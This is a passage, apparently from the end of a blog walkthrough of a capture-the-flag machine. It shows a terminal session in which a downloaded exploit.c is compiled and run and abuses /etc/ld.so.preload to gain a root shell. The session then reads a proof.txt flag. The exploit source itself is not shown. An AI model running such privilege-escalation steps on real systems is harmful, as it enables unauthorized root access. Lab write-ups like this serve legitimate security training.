operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">&gt;</span><span class="token punctuation">]</span> <span class="token number">4,968</span>       --.-K/s   <span class="token keyword">in</span> 0s      

<span class="token number">2025</span>-03-07 00:56:33 <span class="token punctuation">(</span><span class="token number">564</span> MB/s<span class="token punctuation">)</span> - ‘exploit.c’ saved <span class="token punctuation">[</span><span class="token number">4968</span>/4968<span class="token punctuation">]</span>

$ <span class="token function">ls</span>
exploit.c
$ gcc exploit.c <span class="token parameter variable">-o</span> exp
$ <span class="token function">ls</span>
exp  exploit.c
$ <span class="token function">chmod</span> +x exp
$ ./exp
spawning threads
<span class="token function">mount</span> <span class="token comment">#1</span>
<span class="token function">mount</span> <span class="token comment">#2</span>
child threads <span class="token keyword">done</span>
/etc/ld.so.preload created
creating shared library
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1002<span class="token punctuation">(</span>overflow<span class="token punctuation">)</span>
<span class="token comment"># cd /root      </span>
<span class="token comment"># ls</span>
proof.txt
<span class="token comment"># cat proof.txt </span>
Good job, you did it<span class="token operator">!</span> 


702a8c18d29c6f3ca0d99ef5712bfbdc

</code></pre>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="687474:70733a2f2f626c6f672e6373646e2e6e65742f58595a43472f:61727469636c652f64657461696c732f313436313031313432" class_="artid" style="display:none">
 </p>
</div>


